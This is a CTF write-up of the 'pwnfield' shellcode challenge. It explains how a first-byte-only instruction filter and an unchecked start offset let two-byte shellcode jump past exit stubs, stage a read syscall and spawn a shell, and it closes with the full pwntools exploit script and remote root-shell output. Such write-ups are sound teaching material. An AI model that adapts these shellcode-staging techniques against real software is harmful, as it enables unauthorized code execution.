---
title: pwnfield writeup
date: 2025-06-02
description: "[pwn] writeup of the pwnfield challenge from nops ctf"
tags: ["ctf","pwn"]
---
# Challenge description

We discovered that PwnTopia use their secret mine to collect shellcodium, a very rare and powerful resource! We need it too, to be able to defend N0PStopia. However, PwnTopia has put some mines in the way to the shellcodium, but we are lucky PwnTopia left their most powerful tool, a shell , sh on their way out! Can this be a secret message? Can you manage to avoid the mines and use their tool against them?

(attached [source code](/files/pwnfield/pwnfield.c) and binary with dockerfile)

huge thanks to [xneve](https://github.com/xneve) for helping with this challenge

# Solution

from challenge description and by analyzing the source code we can see that this is a shellcode challenge that works like this:

from source code:

```c
#define MAX_INSTRUCTIONS 32
#define USER_INSTR_SIZE 5
#define MINE_SIZE 12
#define LINE_SIZE (USER_INSTR_SIZE + MINE_SIZE)
#define TOTAL_SIZE (LINE_SIZE * MAX_INSTRUCTIONS) + 1
 
const uint8_t exit_mine[] = {
    0xB8, 0x3C, 0x00, 0x00, 0x00,     // mov eax, 60 (exit syscall)
    0xBF, 0x39, 0x05, 0x00, 0x00,     // mov edi, 1337 (exit code)
    0x0F, 0x05                        // syscall      
};
// some code 

    for (int i = 0; i < MAX_INSTRUCTIONS; i++) {
        printf("Instruction %d/32 (5 bytes mov): ", i + 1);
        fflush(stdout);

        uint8_t buf[USER_INSTR_SIZE];
        ssize_t n = read(0, buf, USER_INSTR_SIZE);
        if (n != USER_INSTR_SIZE) {  // read exactly 5 bytes
            puts("Bad input.");
            exit(1);
        }

        if (strncmp((char *)buf, "exit", 4) == 0) {
            puts("Starting execution!");
            break;
        }

        if (buf[0] < 0xB8 || buf[0] > 0xBF) { // checks if the first byte is mov or imm32 instruction
            puts("Only mov r32, imm32 allowed.");
            exit(1);
        }

        memcpy(p, buf, USER_INSTR_SIZE); //copy user input to the buffer
        p += USER_INSTR_SIZE;

        memcpy(p, exit_mine, MINE_SIZE); // append exit mine instrucions
        p += MINE_SIZE;
    }
    //some code
    void *start = mem + (((int64_t)index * LINE_SIZE) % TOTAL_SIZE); // calculate the start address for execution 

    puts("Executing...");
    ((void(*)())start)(); // execute the shellcode
```

so after every input of 5 bytes that needs to be a mov instruction, there is a `exit mine` that is appended to the buffer that exits the program

this is how it looks like in gdb after sending 

```python
payload = b'\xb8' + b'\x90' * 4 # mov eax + nop nop nop nop
payload += b'\xb8' + b'\x90' * 4 # mov eax + nop nop nop nop
```

![test](/images/pwnfield/pwnfield_test.png)

but we can see that only frist byte is checked, so further bytes can be anything (like `nop` instructions here)

also starting point of execution is just checked by boundary of the buffer, not by offset in the buffer - execution can start anywhere in the buffer  - here it start with `nop nop nop...` not `mov eax, 0x90909090`



lets create a wrapper for the shellcode so it will pass the checks and jump over the `exit mine` instructions

```python
def wrap(inside,jump=b'\x0d'):
    frame1 = b'\xb8' #  mov eax 
    frame2 = b'\xeb' + jump # jump
    op = frame1 + inside + frame2 
    return op
```

by sending `\xCC` optcode and starting execution at index `0` executions stops with `SIGTRAP`:

```python
payload = b''
payload += wrap(b'\xCC\xCC')  # int3
payload += wrap(b'\xCC\xCC')
payload += wrap(b'\xCC\xCC')

io.send(payload)
io.sendlineafter(': ', b'exit')
io.sendlineafter(b'?', b'0') #starting instruction at index 0
```

in gdb :

![int3](/images/pwnfield/pwnfield_int3.png)

now we can write shellcode using two bytes long instructions

state of registers when entering the shellcode:

![registers](/images/pwnfield/pwnfield_registers.png)

in rdx we can see pointer to  the buffer, which we can use to overwrite it with read syscall

to execute read we need to set:

- rax to 0 (read syscall number) - already set
- rdi to 0 (stdin)
- rsi to pointer to the buffer
- rdx to size of the buffer

so we need to execute:

```asm
xor rdi, rdi        ; rdi = 0 (stdin)
push rdx            ; push rdx (pointer to the buffer)
pop rsi             ; pop rdx to rsi (moving pointer to the buffer to rsi)
xor rdx, rdx        ; rdx = 0 (size of the buffer)
mov dh, 0x2        ; rdx = 0x200 (size of the buffer)
syscall             ; execute syscall (read)
```

in python: 

```python
payload +=wrap(b'\x31\xff') # xor rdi, rdi -> rdi = 0 (stdin)
payload +=wrap(b'\x52\x5e') # push rdx; pop rsi -> moving pointer to the buffer to rsi
payload +=wrap(b'\x31\xd2') # xor rdx, rdx -> rdx = 0 (size of the buffer)
payload +=wrap(b'\xb6\x02') # mov dh, 0x2 -> rdx = 0x200 (size of the buffer)
payload +=wrap(b'\x0f\x05') # syscall 
```

after sending this program will read 512 bytes from stdin - that is enough to write shellcode and nop sledge to it

```python
io.sendline(b'\x90' * 100 + asm(shellcraft.amd64.linux.sh()))
io.interactive()
```

this is how it looks in gdb:

![shellcode](/images/pwnfield/pwnfield_shellcode.png)


lets run the exploit on remote server:

```txt
# ./expl.py REMOTE
[*] '/nopsctf/pwnfiled/docker/src/pwnfield'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 0.cloud.chals.io on port 13857: Done
[*] Switching to interactive mode
 Executing...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
flag.txt  pwnfield  sh
$ cat flag.txt
N0PS{0n3_h45_70_jump_0n_7h3_204d_70_pwnt0p1a}
```

whole exploit code:

```python
#!/usr/bin/python3
from pwn import *
PATH = './pwnfield'
ADDR = '0.cloud.chals.io'
PORT = 13857
elf = context.binary = ELF(PATH)
context.log_level = 'info'
#breakpoint just before jumping to the shellcode
gs = '''
b* main+594
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
def sa(data):
    io.sendafter(b': ', data)
######################
def wrap(inside,jump=b'\x0d'):
    frame1 = b'\xb8' #  mov eax to fulfill the first byte check
    frame2 = b'\xeb' + jump # jump to skip exit 
    op = frame1 + inside + frame2 
    return op

payload = b''
payload +=wrap(b'\x31\xff') # xor rdi, rdi -> rdi = 0 (stdin)
payload +=wrap(b'\x52\x5e') # push rdx; pop rsi -> moving pointer to the buffer to rsi
payload +=wrap(b'\x31\xd2') # xor rdx, rdx -> rdx = 0 (size of the buffer)
payload +=wrap(b'\xb6\x02') # mov dh, 0x2 -> rdx = 0x200 (size of the buffer)
payload +=wrap(b'\x0f\x05') # syscall 
io.send(payload)

io.sendlineafter(': ', b'exit')
io.sendlineafter(b'?', b'0') #starting instruction
io.sendline(b'\x90' * 100 + asm(shellcraft.amd64.linux.sh())) #shellcode 
io.interactive()
```